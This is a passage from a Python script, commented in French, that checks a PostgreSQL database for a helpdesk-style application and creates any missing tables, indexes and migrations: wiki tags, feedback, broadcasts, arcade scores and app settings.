                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("wiki_tags")
    else:
        tables_verified.append("wiki_tags")
    
    # Table: wiki_article_tags (table de liaison)
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_article_tags'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_article_tags (
                article_id INTEGER NOT NULL,
                tag_id INTEGER NOT NULL,
                PRIMARY KEY (article_id, tag_id),
                FOREIGN KEY (article_id) REFERENCES wiki_articles(id) ON DELETE CASCADE,
                FOREIGN KEY (tag_id) REFERENCES wiki_tags(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("wiki_article_tags")
        
        # Migration: migrer les tags existants depuis le champ TEXT vers la structure normalisée
        logger.info("   - Migration des tags existants...")
        cursor.execute("SELECT id, tags FROM wiki_articles WHERE tags IS NOT NULL AND tags != ''")
        articles_with_tags = cursor.fetchall()
        
        tag_count = 0
        for article in articles_with_tags:
            tags_str = article['tags'] or ''
            if tags_str:
                # Séparer les tags par virgule
                tag_names = [t.strip() for t in tags_str.split(',') if t.strip()]
                for tag_name in tag_names:
                    # Créer le tag s'il n'existe pas
                    cursor.execute("""
                        INSERT INTO wiki_tags (name) 
                        VALUES (%s)
                        ON CONFLICT (name) DO NOTHING
                    """, (tag_name,))
                    
                    # Récupérer l'ID du tag
                    cursor.execute("SELECT id FROM wiki_tags WHERE name = %s", (tag_name,))
                    tag_row = cursor.fetchone()
                    if tag_row:
                        tag_id = tag_row['id']
                        # Lier l'article au tag
                        cursor.execute("""
                            INSERT INTO wiki_article_tags (article_id, tag_id)
                            VALUES (%s, %s)
                            ON CONFLICT (article_id, tag_id) DO NOTHING
                        """, (article['id'], tag_id))
                        tag_count += 1
        
        if tag_count > 0:
            logger.info(f"   - {tag_count} tag(s) migre(s) depuis les articles existants")
    else:
        tables_verified.append("wiki_article_tags")
    
    # Table: wiki_feedback
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_feedback'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_feedback (
                id SERIAL PRIMARY KEY,
                article_id INTEGER NOT NULL,
                user_name VARCHAR(255) NOT NULL,
                feedback_type VARCHAR(20) NOT NULL CHECK(feedback_type IN ('useful', 'not_useful', 'outdated', 'needs_update')),
                comment TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (article_id) REFERENCES wiki_articles(id) ON DELETE CASCADE
            )
        """)
        tables_created.append("wiki_feedback")
    else:
        tables_verified.append("wiki_feedback")
    
    # Table: wiki_search_log
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables 
            WHERE table_schema = 'public' 
            AND table_name = 'wiki_search_log'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE wiki_search_log (
                id SERIAL PRIMARY KEY,
                query VARCHAR(500) NOT NULL,
                user_name VARCHAR(255),
                results_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("wiki_search_log")
    else:
        tables_verified.append("wiki_search_log")
    
    # Index full-text pour recherche PostgreSQL
    cursor.execute("""
        SELECT indexname 
        FROM pg_indexes 
        WHERE tablename = 'wiki_articles' AND indexname = 'wiki_articles_search_idx'
    """)
    if not cursor.fetchone():
        try:
            cursor.execute("""
                CREATE INDEX wiki_articles_search_idx ON wiki_articles 
                USING GIN (to_tsvector('french', 
                    coalesce(title, '') || ' ' || 
                    coalesce(content, '') || ' ' || 
                    coalesce(tags, '')
                ))
            """)
            logger.info("   - Index full-text GIN cree pour wiki_articles")
        except Exception as e:
            logger.info(f"   - Erreur lors de la creation de l'index full-text: {e}")
    else:
        logger.info("   - Index full-text deja existant")
    
    # ========== TABLE: dispatch_runner_scores ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'dispatch_runner_scores'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE dispatch_runner_scores (
                id SERIAL PRIMARY KEY,
                username VARCHAR(255) NOT NULL,
                score INTEGER NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("dispatch_runner_scores")
        cursor.execute("CREATE INDEX idx_runner_scores_score ON dispatch_runner_scores (score DESC)")
        logger.info("   - Table dispatch_runner_scores creee")
    else:
        tables_verified.append("dispatch_runner_scores")

    ensure_idempotency_tables(cursor)

    # ========== TABLE: arcade_scores (generic multi-game leaderboard) ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'arcade_scores'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE arcade_scores (
                id SERIAL PRIMARY KEY,
                game_name VARCHAR(50) NOT NULL,
                username VARCHAR(255) NOT NULL,
                score INTEGER NOT NULL,
                level INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("arcade_scores")
        cursor.execute("CREATE INDEX idx_arcade_scores_game ON arcade_scores (game_name, score DESC)")
        logger.info("   - Table arcade_scores creee")
    else:
        tables_verified.append("arcade_scores")

    # Table pour les diffusions/annonces (Remplace Teams)
    cursor.execute("SELECT 1 FROM information_schema.tables WHERE table_name='broadcasts'")
    if not cursor.fetchone():
        cursor.execute("""
            CREATE TABLE broadcasts (
                id SERIAL PRIMARY KEY,
                title VARCHAR(255) NOT NULL,
                content TEXT NOT NULL,
                is_permanent BOOLEAN DEFAULT FALSE,
                is_active BOOLEAN DEFAULT TRUE,
                created_by VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("broadcasts")
        logger.info("   - Table broadcasts creee")
    else:
        tables_verified.append("broadcasts")

    # Table pour les images des diffusions
    cursor.execute("SELECT 1 FROM information_schema.tables WHERE table_name='broadcast_images'")
    if not cursor.fetchone():
        cursor.execute("""
            CREATE TABLE broadcast_images (
                id SERIAL PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                original_filename VARCHAR(255),
                filepath TEXT NOT NULL,
                uploaded_by VARCHAR(255),
                file_size INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("broadcast_images")
        logger.info("   - Table broadcast_images creee")
    else:
        tables_verified.append("broadcast_images")
    
    # Normalisation finale après création de toutes les tables
    
    # 1. Migration technicien_id dans incidents
    cursor.execute("""
        SELECT column_name FROM information_schema.columns 
        WHERE table_name='incidents' AND column_name='technicien_id'
    """)
    if not cursor.fetchone():
        cursor.execute("ALTER TABLE incidents ADD COLUMN technicien_id INTEGER REFERENCES techniciens(id) ON DELETE SET NULL")
        logger.info("   - Colonne technicien_id ajoutee a la table incidents")
        
        # Migrer données
        cursor.execute("SELECT id, prenom FROM techniciens")
        techs = cursor.fetchall()
        for tech in techs:
            cursor.execute("UPDATE incidents SET technicien_id = %s WHERE collaborateur = %s AND technicien_id IS NULL", (tech['id'], tech['prenom']))
            
        # Ajouter les index sur technicien_id maintenant que la colonne existe
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_incidents_technicien_id ON incidents (technicien_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_incidents_archived_technicien ON incidents (archived, technicien_id)")
        logger.info("   - Index sur technicien_id crees")

    # 2. Correction des statuts (legacy cleanup)
    legacy_status_map = [
        ('A traiter', 'Non traité'),
        ('En cours', 'En cours'),
        ('Suspendu', 'Suspendu'),
        ('Terminé', 'Traité'),
    ]

    for bad_value, good_value in legacy_status_map:
        # Correction table incidents
        cursor.execute(
            "UPDATE incidents SET etat=%s WHERE etat=%s",
            (good_value, bad_value),
        )
        if cursor.rowcount:
            logger.info(f"   - {cursor.rowcount} incident(s) corriges: {bad_value} -> {good_value}")
            
        # Correction table statuts
        cursor.execute(
            "UPDATE statuts SET nom=%s WHERE nom=%s",
            (good_value, bad_value),
        )
        if cursor.rowcount:
            logger.info(f"   - {cursor.rowcount} statut(s) corriges: {bad_value} -> {good_value}")

    # ========== TABLE: app_settings ==========
    cursor.execute("""
        SELECT EXISTS (
            SELECT FROM information_schema.tables
            WHERE table_schema = 'public'
            AND table_name = 'app_settings'
        )
    """)
    if not cursor.fetchone()['exists']:
        cursor.execute("""
            CREATE TABLE app_settings (
                key VARCHAR(255) PRIMARY KEY,
                value TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        tables_created.append("app_settings")
        logger.info("   - Table app_settings creee")

        import json as _json
        import os as _os
        _settings_file = _os.path.join(_os.path.dirname(__file__), '..', '..', 'data', 'settings.json')
        if _os.path.exists(_settings_file):
            try:
                with open(_settings_file, 'r') as _f:
                    _data = _json.load(_f)
                for _k, _v in _data.items():
                    cursor.execute(
                        "INSERT INTO app_settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING",
                        (_k, _json.dumps(_v)),
                    )
                logger.info(f"   - {len(_data)} setting(s) migre(s) depuis settings.json")
            except Exception as _e:
                logger.info(f"   - Avertissement: migration settings.json echouee: {_e}")
    else:
        tables_verified.append("app_settings")

    # Index composite sur broadcasts (perf)
    cursor.execute("""
        SELECT indexname FROM pg_indexes
        WHERE tablename='broadcasts' AND indexname='idx_broadcasts_active_permanent'
    """)
    if not cursor.fetchone():
        cursor.execute("""
            CREATE INDEX idx_broadcasts_active_permanent
            ON broadcasts (is_active, is_permanent DESC, created_at DESC)
        """)
        logger.info("   - Index idx_broadcasts_active_permanent cree")

    # Commit toutes les modifications
    conn.commit()
    cursor.execute("SELECT pg_advisory_unlock(%s)", (DB_INTEGRITY_LOCK_KEY,))
    cursor.close()
    conn.close()
    
    # Afficher le résumé
    logger.info("\n" + "="*60)
    logger.info("RESUME DE LA VERIFICATION DE LA BASE DE DONNEES")
    logger.info("="*60)
    
    if tables_created:
        logger.info(f"\n{len(tables_created)} table(s) creee(s):")
        for table in tables_created:
            logger.info(f"   - {table}")
    
    if tables_verified:
        logger.info(f"\n{len(tables_verified)} table(s) verifiee(s) (deja existantes):")
        for table in tables_verified:
            logger.info(f"   - {table}")
    
    logger.info(f"\nIntegrite de la base: OK")
    logger.info(f"Type: PostgreSQL")
    logger.info("\nLa base de donnees est prete!")
    logger.info("="*60 + "\n")
    
    return True

if __name__ == "__main__":
    try:
        ensure_database_integrity()
        logger.info("Verification terminee avec succes!")
    except Exception as e:
        logger.info(f"ERREUR lors de la verification: {e}")
        import traceback
        traceback.print_exc()
        exit(1)
